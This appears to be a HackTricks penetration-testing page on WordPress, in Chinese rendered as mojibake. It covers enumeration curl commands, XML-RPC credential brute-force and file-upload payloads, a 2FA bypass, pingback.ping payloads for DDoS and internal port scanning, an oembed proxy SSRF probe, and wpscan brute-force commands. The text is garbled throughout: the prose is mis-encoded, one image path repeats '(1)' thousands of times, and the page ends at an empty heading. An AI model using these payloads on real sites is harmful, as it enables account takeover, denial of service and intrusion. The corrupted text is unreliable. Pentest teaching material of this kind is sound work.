# Wordpress

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## åŸºæœ¬ä¿¡æ¯

**ä¸Šä¼ **çš„æ–‡ä»¶ä½äºï¼š`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**ä¸»é¢˜æ–‡ä»¶å¯ä»¥åœ¨/wp-content/themes/ä¸­æ‰¾åˆ°ï¼Œ**æ‰€ä»¥å¦‚æœä½ æ›´æ”¹äº†ä¸€äº›ä¸»é¢˜çš„phpä»¥è·å¾—RCEï¼Œä½ å¯èƒ½ä¼šä½¿ç”¨é‚£ä¸ªè·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨**ä¸»é¢˜twentytwelve**ï¼Œä½ å¯ä»¥**è®¿é—®** **404.php** æ–‡ä»¶åœ¨ï¼š[**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**å¦ä¸€ä¸ªæœ‰ç”¨çš„urlå¯èƒ½æ˜¯ï¼š** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

åœ¨ **wp-config.php** ä¸­ä½ å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„æ ¹å¯†ç ã€‚

é»˜è®¤ç™»å½•è·¯å¾„æ£€æŸ¥ï¼š_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦WordPressæ–‡ä»¶**

* `index.php`
* `license.txt` åŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œå¦‚å®‰è£…çš„WordPressç‰ˆæœ¬ã€‚
* `wp-activate.php` ç”¨äºè®¾ç½®æ–°WordPressç«™ç‚¹æ—¶çš„ç”µå­é‚®ä»¶æ¿€æ´»è¿‡ç¨‹ã€‚
* ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰ï¼š
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä»£è¡¨WordPressçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå…è®¸ä½¿ç”¨HTTPä½œä¸ºä¼ è¾“æœºåˆ¶å’ŒXMLä½œä¸ºç¼–ç æœºåˆ¶ä¼ è¾“æ•°æ®ã€‚è¿™ç§é€šä¿¡å·²è¢«WordPress [REST API](https://developer.wordpress.org/rest-api/reference) æ›¿ä»£ã€‚
* `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜å‚¨æ’ä»¶å’Œä¸»é¢˜çš„ä¸»ç›®å½•ã€‚
* `wp-content/uploads/` æ˜¯å­˜å‚¨ä¸Šä¼ åˆ°å¹³å°çš„ä»»ä½•æ–‡ä»¶çš„ç›®å½•ã€‚
* `wp-includes/` è¿™æ˜¯å­˜å‚¨æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œå¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScriptæ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚
* `wp-sitemap.xml` åœ¨Wordpressç‰ˆæœ¬5.5åŠä»¥ä¸Šï¼ŒWordpressä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å…±å¸–å­å’Œå…¬å¼€æŸ¥è¯¢å¸–å­ç±»å‹å’Œåˆ†ç±»çš„ç«™ç‚¹åœ°å›¾XMLæ–‡ä»¶ã€‚

**ååˆ©ç”¨**

* `wp-config.php` æ–‡ä»¶åŒ…å«WordPressè¿æ¥åˆ°æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“åç§°ã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€è®¤è¯å¯†é’¥å’Œç›ï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¿™ä¸ªé…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨æ¥æ¿€æ´»DEBUGæ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶å¯èƒ½å¾ˆæœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

* **ç®¡ç†å‘˜**
* **ç¼–è¾‘**ï¼šå‘å¸ƒå¹¶ç®¡ç†ä»–å’Œä»–äººçš„å¸–å­
* **ä½œè€…**ï¼šå‘å¸ƒå¹¶ç®¡ç†ä»–è‡ªå·±çš„å¸–å­
* **è´¡çŒ®è€…**ï¼šç¼–å†™å¹¶ç®¡ç†ä»–çš„å¸–å­ï¼Œä½†ä¸èƒ½å‘å¸ƒå®ƒä»¬
* **è®¢é˜…è€…**ï¼šæµè§ˆå¸–å­å¹¶ç¼–è¾‘ä»–ä»¬çš„ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å–WordPressç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦å¯ä»¥æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„**æºä»£ç **ä¸­ï¼ˆæ¥è‡ª[https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)çš„ç¤ºä¾‹ï¼‰ï¼š

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* CSSé“¾æ¥æ–‡ä»¶

![](<../../.gitbook/assets/image (344).png>)

* JavaScriptæ–‡ä»¶

![](<../../.gitbook/assets/image (346).png>)

### è·å–æ’ä»¶

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### æå–é€šç”¨ç‰ˆæœ¬ä¿¡æ¯

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œè¿™äº›å·¥ä½œæµç¨‹ç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

ä½ å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°æ‰€æœ‰çš„æ’ä»¶å’Œä¸»é¢˜ï¼Œä½ éœ€è¦**ä¸»åŠ¨æš´åŠ›ç ´è§£æ’ä»¶å’Œä¸»é¢˜åˆ—è¡¨**ï¼ˆå¹¸è¿çš„æ˜¯ï¼Œæœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«äº†è¿™äº›åˆ—è¡¨ï¼‰ã€‚

### ç”¨æˆ·

**ID æš´åŠ›ç ´è§£**

é€šè¿‡æš´åŠ›ç ´è§£ç”¨æˆ· IDï¼Œä½ å¯ä»¥ä» WordPress ç½‘ç«™è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œè¿™æ„å‘³ç€ id æ˜¯**æœ‰æ•ˆ**çš„ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œåˆ™ id æ˜¯**æ— æ•ˆ**çš„ã€‚

**wp-json**

æ‚¨è¿˜å¯ä»¥å°è¯•é€šè¿‡æŸ¥è¯¢ä»¥ä¸‹å†…å®¹æ¥è·å–ç”¨æˆ·ä¿¡æ¯ï¼š
```
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯ä»¥æ­ç¤ºä¸€äº›ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
è¯·æ³¨æ„ï¼Œæ­¤ç«¯ç‚¹ä»…æš´éœ²å·²å‘è¡¨æ–‡ç« çš„ç”¨æˆ·ã€‚**åªæœ‰å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·ä¿¡æ¯æ‰ä¼šè¢«æä¾›**ã€‚

è¿˜è¦æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages** å¯èƒ½ä¼šæ³„éœ² IP åœ°å€ã€‚

#### ç™»å½•ç”¨æˆ·åæšä¸¾

åœ¨ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œå¦‚æœæŒ‡å®šçš„**ç”¨æˆ·åå­˜åœ¨ä¸å¦**ï¼Œ**æ¶ˆæ¯**ä¼š**ä¸åŒ**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œå‡­è¯æš´åŠ›ç ´è§£ï¼Œæˆ–ä½¿ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚ï¼ˆä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥[ä½¿ç”¨è¿™ä¸ª](https://github.com/relarizky/wpxploit)æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼‰ã€‚

è¦æŸ¥çœ‹å®ƒæ˜¯å¦æ´»åŠ¨ï¼Œè¯·å°è¯•è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€æ­¤è¯·æ±‚ï¼š

**æ£€æŸ¥**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
**å‡­è¯æš´åŠ›ç ´è§£**

**`wp.getUserBlogs`**ã€**`wp.getCategories`** æˆ– **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ç”¨äºæš´åŠ›ç ´è§£å‡­è¯çš„æ–¹æ³•ã€‚å¦‚æœä½ æ‰¾åˆ°äº†å®ƒä»¬ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼çš„å†…å®¹ï¼š
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å¦‚æœå‡­è¯æ— æ•ˆï¼Œåº”è¯¥åœ¨200ä»£ç å“åº”ä¸­å‡ºç°_"Incorrect username or password"_çš„æ¶ˆæ¯ã€‚

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1. (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1. (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1. (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1. (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
è¿˜æœ‰ä¸€ç§**æ›´å¿«çš„æ–¹æ³•**ä½¿ç”¨**`system.multicall`**æ¥æš´åŠ›ç ´è§£å‡­æ®ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­æ®ï¼š

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡2FA**

è¿™ç§æ–¹æ³•æ˜¯ä¸ºç¨‹åºè®¾è®¡çš„ï¼Œä¸é€‚ç”¨äºäººç±»ï¼Œè€Œä¸”å·²ç»è¿‡æ—¶ï¼Œå› æ­¤å®ƒä¸æ”¯æŒ2FAã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„å‡­æ®ï¼Œä½†ä¸»å…¥å£å—åˆ°2FAä¿æŠ¤ï¼Œ**ä½ å¯èƒ½å¯ä»¥åˆ©ç”¨xmlrpc.phpç™»å½•ï¼Œç»•è¿‡2FA**ã€‚è¯·æ³¨æ„ï¼Œä½ æ— æ³•é€šè¿‡æ§åˆ¶å°æ‰§è¡Œæ‰€æœ‰æ“ä½œï¼Œä½†ä½ å¯èƒ½ä»ç„¶èƒ½å¤Ÿå®ç°RCEï¼Œæ­£å¦‚Ippsecåœ¨[https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)ä¸­è§£é‡Šçš„é‚£æ ·ã€‚

**DDoSæˆ–ç«¯å£æ‰«æ**

å¦‚æœä½ èƒ½åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°æ–¹æ³•_**pingback.ping**_ï¼Œä½ å¯ä»¥ä½¿Wordpresså‘ä»»ä½•ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥ç”¨æ¥è¯·æ±‚**æˆåƒä¸Šä¸‡**çš„Wordpress**ç«™ç‚¹**è®¿é—®ä¸€ä¸ª**ä½ç½®**ï¼ˆå› æ­¤åœ¨é‚£ä¸ªä½ç½®é€ æˆ**DDoS**ï¼‰æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨å®ƒè®©**Wordpress**å»**æ‰«æ**ä¸€äº›å†…éƒ¨**ç½‘ç»œ**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»ä½•ç«¯å£ï¼‰ã€‚
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** å¹¶ä¸”å€¼ **å¤§äº** **0** (17)ï¼Œè¿™æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹å‰ä¸€èŠ‚ä¸­å…³äº **`system.multicall`** çš„ä½¿ç”¨ï¼Œäº†è§£å¦‚ä½•æ»¥ç”¨è¿™ä¸ªæ–¹æ³•æ¥å¼•å‘ **DDoS**ã€‚

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸ä½äºWordpressç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼š**`/wp-cron.php`**\
å½“æ­¤æ–‡ä»¶è¢«**è®¿é—®**æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¡â€œ**ç¹é‡**â€çš„MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤å¯èƒ½è¢«**æ”»å‡»è€…**ç”¨æ¥**å¼•å‘** **DoS**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯æ¬¡é¡µé¢åŠ è½½æ—¶ï¼ˆä»»ä½•æ—¶å€™å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•Wordpressé¡µé¢ï¼‰éƒ½ä¼šè°ƒç”¨`wp-cron.php`ï¼Œè¿™åœ¨é«˜æµé‡ç½‘ç«™ä¸Šå¯èƒ½ä¼šå¼•èµ·é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºå†…åˆ›å»ºä¸€ä¸ªçœŸæ­£çš„cronjobï¼Œä»¥å®šæœŸé—´éš”æ‰§è¡Œæ‰€éœ€æ“ä½œï¼ˆä¸å¼•èµ·é—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—®_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWorpressç«™ç‚¹å¯èƒ½ä¼šå‘ä½ å‘å‡ºè¯·æ±‚ã€‚

ä»¥ä¸‹æ˜¯å®ƒä¸å·¥ä½œæ—¶çš„å“åº”ï¼š

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

æ­¤å·¥å…·æ£€æŸ¥**methodName: pingback.ping**å’Œè·¯å¾„**/wp-json/oembed/1.0/proxy**æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå®ƒå°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

### è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## é€šè¿‡è¦†å†™ä¸€ç‚¹ä½è·å–è®¿é—®æƒé™

